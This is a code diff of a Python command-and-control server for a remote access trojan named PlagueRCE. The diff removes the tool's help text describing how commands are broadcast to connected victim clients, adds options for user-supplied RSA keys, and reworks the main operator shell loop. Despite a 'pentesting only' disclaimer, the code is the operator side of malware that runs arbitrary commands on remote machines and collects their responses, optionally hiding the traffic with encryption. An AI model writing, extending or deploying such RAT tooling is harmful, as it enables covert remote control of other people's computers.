@@ -20,81 +20,6 @@ illegal manner, you will end up in prison and I will not be held responsible for
 Please note: this server is strictly to be used for pentesting only, therefore
 it does not have any functions relating to denial of service attacks or anything else 
 intended to cause harm.
-
-PlagueRCE is an RAT server which takes commands from user input and executes them on a 
-chosen connected client.
-
-CLI works in the following way: 
-1. user connects to client via user input of the chosen clients ip address.
-2. user inputs a command to be executed by the chosen client. 
-3. client executes the command. (If the command is a CLI command it will
-be executed by the server and not be executed by the chosen client)
-4. In the case of a client disconnecting from the server mid way through sending a command
-or receiving a response, the server will remove the client from the list of connected clients.
-5. Everytime a client sends a response back to the user, it is stored within the response list
-which can be accessed via various commands such as 'current_latest'.
-
-
-
-Encryption mode:
-Each generated key pair is a 2048 bit RSA key pair. No I am not going to allow the user
-to choose the size of the key pair, it will break my code, 2048 bits is nice.
-Server loads up in unencryption mode by default, but can be switched to encryption mode via 
-encryption_mode command. When a client connects to the server, it treats the current key pair
-on the server in encryption mode as the clients permanent key pair, so make sure you are
-using encryption mode properly otherwise it can cause problems with server/client communication.
-For this reason, I suggest you to stay on encryption mode the entire time and not generate a new key pair
-when you are working on large scale operations, as it will have a high chance of causing problems.
-When you generate a key pair, configure the key pair with your payload and then have the client
-execute the payload for encrypted communication.
-If you are too stupid and not skilled enough to use encryption mode properly and effectively, 
-then don't use it at all as you will only just cause problems with your own operation.
-
-
-
-CLI commands to help the user:
-
-/ escapes send options and CLI commands (e.g. /$command will have client execute $command)
-
-Send command options
-By default, commands are executed on the first payload on the currently connected client
-$command: $ before a command to execute command on all payloads on currently connected client 
-!command: ! before a command to execute command on first payload across all clients 
-?command: ? before a command to execute command to execute command on all payloads across all clients 
-*command: * before a command to execute the command on first payload on all clients using a particular OS
-&command: & before a command to execute the command on all payloads across all clients using a particular OS
-
-User help 
-help: Show this message
-quit: Exit the program
-
-Encryption mode
-current_keys: Display current server key pair if in encryption mode
-encryption_mode: Enable encryption mode, and generate a new key pair
-new_keys: Generate new server key pair (dangerous)
-unencryption_mode: Disable encryption mode and delete existing key pair
-
-Current connected client
-current: Show client the user is currently connected to
-current_client_OS: Display current connected client's operating system
-current_latest: Show latest response from currently connected client
-current_all: Show all responses from currently connected client
-change: Change the current connected client
-
-All connected clients
-list: List all connected clients and their information
-list_OS: Display all operating systems being used by clients
-who_responded: Display list of all clients who have sent a response to server
-responses_amount: Trigger temporary CLI to show specific amount of responses from a client
-responses_latest: Trigger temporary CLI to show the latest response from a client
-responses_all: Display all responses from all clients
-responses_all_OS: Display all responses from all clients using a particular OS
-    
-Connection information:
-
-Connections are made through TCP (transmission control protocol).
-Messages sent between the server and client are sent utf-8 encoded.
-The bytesize of the messages being sent between the server and client is 1024.
     '''
     def __init__(self, host_port: int=55555, bytesize: int=1024) -> None:
         ''' Class Initializer '''
@@ -412,10 +337,23 @@ The bytesize of the messages being sent between the server and client is 1024.
         
         # Function for command to generate new key pair and switch on encryption mode
         def encryption_mode() -> None:
-            ''' Function for command to generate new key pair and switch on encryption mode '''
+            ''' 
+            Function for command to switch on encryption mode 
+            and allow user to either generate new key pair or use their own
+            2048 bit RSA key pair
+            '''
 
             if self.encryption_mode_flag == False:
 
+                # User can use their own 2048 bit RSA key pair
+                if input(Fore.GREEN+'Enter y if you would like to use your own RSA 2048 bit key pair (case sensitive): ').strip()  == 'y':
+                    self.private_key = input('Enter your RSA 2048 bit private key:\n').strip() 
+                    self.public_key = input('Enter your RSA 2048 bit public key:\n').strip() 
+                    self.encryption_mode_flag = True
+                    print(Fore.LIGHTMAGENTA_EX+f'\nYour RSA private key:\n{self.private_key}\nYour RSA public key:\n{self.public_key}\nYou are now in encryption mode')
+                    return True
+                print(Fore.LIGHTMAGENTA_EX)
+                      
                 # Generate and display new server key pair
                 self.private_key, self.public_key = cryptography_toolkit.generate_key_pair()
                 self.encryption_mode_flag = True
@@ -425,9 +363,22 @@ The bytesize of the messages being sent between the server and client is 1024.
         
         # Function for command to generate new server key pair in encryption mode
         def new_keys() -> None:
-            ''' Function for command to generate new server key pair in encryption mode '''
+            ''' 
+            Function for command to generate new server key pair in encryption mode or to 
+            change server key pair to user's specified 2048 bit RSA key pair
+            '''
 
             if self.encryption_mode_flag == True:
+
+                # User can use their own 2048 bit RSA key pair
+                if input(Fore.GREEN+'Enter y if you would like to use your own RSA 2048 bit key pair (case sensitive): ').strip()  == 'y':
+                    self.private_key = input('Enter your RSA 2048 bit private key:\n').strip() 
+                    self.public_key = input('Enter your RSA 2048 bit public key:\n').strip() 
+                    self.encryption_mode_flag = True
+                    print(Fore.LIGHTMAGENTA_EX+f'\nYour RSA private key:\n{self.private_key}\nYour RSA public key:\n{self.public_key}\n')
+                    return True
+                print(Fore.LIGHTMAGENTA_EX)
+                
                 # Generate and display new server key pair
                 self.private_key, self.public_key = cryptography_toolkit.generate_key_pair()
                 print(f'\nYour new RSA private key:\n{self.private_key}\nYour new RSA public key:\n{self.public_key}\n')
@@ -771,27 +722,25 @@ The bytesize of the messages being sent between the server and client is 1024.
         Handles communication with clients
         Choose a client you would like to access, and send commands to be executed by them
         '''
-        print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ") 
+        try:
+            if input(Fore.GREEN+"Would you like to startup in encryption mode? Enter 'y' for yes (case sensitive): ").strip() == "y":
+                print(Fore.LIGHTMAGENTA_EX)
+                self.command_option('encryption_mode')
+            print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ") 
 
-        # User can use their own 2048 bit RSA key pair
-        if input(Fore.GREEN+'Enter y if you would like to use your own RSA 2048 bit key pair (case sensitive): ').strip()  == 'y':
-            self.private_key = input('Enter your RSA 2048 bit private key:\n').strip() 
-            self.public_key = input('Enter your RSA 2048 bit public key:\n').strip() 
-            self.encryption_mode_flag = True
-            print(Fore.LIGHTMAGENTA_EX+'You are now in encryption mode')
-
-        while True:
-            # Ensure currently connected client is still connected to server
-            if self.connected_client not in self.client_list.keys() and self.connected_client != None:
-                print(f'Currently connected client: {self.connected_client} has disconnected from the server')
-                self.connected_client = None
+            while True:
+                # Ensure currently connected client is still connected to server
+                if self.connected_client not in self.client_list.keys() and self.connected_client != None:
+                    print(f'Currently connected client: {self.connected_client} has disconnected from the server')
+                    self.connected_client = None
                 
-            # Take user input and carry out the given CLI command or send commands to client
-            command: str = input(Fore.LIGHTGREEN_EX+"$ ").strip() # Nice looking shell
-            print(Fore.LIGHTMAGENTA_EX) # All text on the CLI is light magenta
-            if self.command_option(command) == False: # If input was not CLI/server command, send command to client
-                self.send_option(command, self.connected_client) # Check send option and send command to currently connected client
-
+                # Take user input and carry out the given CLI command or send commands to client
+                command: str = input(Fore.LIGHTGREEN_EX+"$ ").strip() # Nice looking shell
+                print(Fore.LIGHTMAGENTA_EX) # All text on the CLI is light magenta
+                if self.command_option(command) == False: # If input was not CLI/server command, send command to client
+                    self.send_option(command, self.connected_client) # Check send option and send command to currently connected client
+        except KeyboardInterrupt:
+            pass
 
     ''' Functions to handle client connections to server '''
     # Handle client disconnection 
@@ -878,8 +827,6 @@ The bytesize of the messages being sent between the server and client is 1024.
                 # Startthread to listen for responses from client
                 client_thread = threading.Thread(target=self.receive_response, args=(client_ip,client), daemon=True)
                 client_thread.start()
-        except OSError:
-            logging.critical(f'WTF DID YOU DO\nQuitting...')
         except: # Pretend the error doesn't exist and it will resolve itself
             pass
 
